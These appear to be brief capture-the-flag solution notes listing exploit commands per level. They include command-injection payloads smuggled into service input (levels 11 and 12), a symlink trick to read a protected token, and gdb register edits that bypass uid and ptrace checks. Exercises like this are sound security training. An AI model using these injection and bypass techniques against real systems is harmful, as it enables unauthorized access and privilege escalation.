level00:
find . / -user flag00

level01:
john --show file.txt

level02:
scp -P 4242 level02@127.0.0.1:level02.pcap .

level04:
curl http://localhost:4747

level08:
ln -sf /home/user/level08/token /tmp/link
./level08 /tmp/link

level09:

level10:
nc -lk 6969
./level10 /tmp/test 127.0.0.1

level11:
nc localhost 5151
echo '; getflag > /tmp/flag11'

level12:
echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT
curl 'localhost:4646?x=$(/*/EXPLOIT)'
cat /tmp/flag12

level13:
gdb ./level13
disas main
b getuid
run
step
print $eax
set $eax=4242
step

level14:
id flag14 -> 3014
gdb getflag
    disas main
    run
    catch syscall ptrace
    commands 1
        set $eax=0
        continue
        end
    b getuid
    run
    step
    set $eax=3014
    step
